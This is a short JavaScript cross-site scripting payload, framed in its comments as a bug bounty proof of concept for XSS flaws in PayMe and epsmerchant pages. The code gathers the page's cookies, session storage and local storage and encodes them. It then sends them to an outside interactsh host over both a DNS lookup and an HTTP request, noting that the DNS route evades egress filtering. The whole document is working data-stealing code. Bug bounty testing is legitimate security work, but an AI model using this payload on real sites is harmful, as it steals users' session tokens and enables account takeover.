/* PoC marker - bug bounty demonstration only.
   Exfil target is an interactsh canary so the interaction is observable.
   Reported under: 2521 (PayMe cash-out DOM XSS), 2516 (epsmerchant reflected XSS). */
(function () {
  var C = "twnqbbnbcyvuefvifbon34pn8omk1kepp.oast.fun";

  // 1. prove execution + which origin
  try { console.log("[PoC] executing on " + document.domain); } catch (e) {}

  // 2. collect what actually matters on the target origins
  var d = {
    domain: document.domain,
    url:    location.href,
    cookie: document.cookie || "(none / HttpOnly)",
    ss:     {},
    ls:     {}
  };
  try { for (var i = 0; i < sessionStorage.length; i++) { var k = sessionStorage.key(i); d.ss[k] = String(sessionStorage.getItem(k)).slice(0, 120); } } catch (e) {}
  try { for (var j = 0; j < localStorage.length;  j++) { var m = localStorage.key(j);  d.ls[m] = String(localStorage.getItem(m)).slice(0, 120); } } catch (e) {}

  // 3. DNS channel - survives HTTP egress filtering, label carries the origin
  var tag = d.domain.replace(/[^a-z0-9]/gi, "").toLowerCase().slice(0, 40);
  try { new Image().src = "https://" + tag + ".dns." + C + "/"; } catch (e) {}

  // 4. HTTP channel - full payload, visible in the interactsh Request pane
  var blob = "";
  try { blob = btoa(unescape(encodeURIComponent(JSON.stringify(d)))).replace(/=+$/, ""); } catch (e) { blob = "encode-failed"; }
  try {
    fetch("https://" + C + "/x?d=" + encodeURIComponent(blob), { mode: "no-cors", credentials: "omit" });
  } catch (e) {
    try { new Image().src = "https://" + C + "/x?d=" + encodeURIComponent(blob); } catch (e2) {}
  }

  // 5. visible confirmation for a screenshot in the report
  try { alert("XSS PoC - origin: " + d.domain + "\ncookie: " + d.cookie.slice(0, 80)); } catch (e) {}
})();
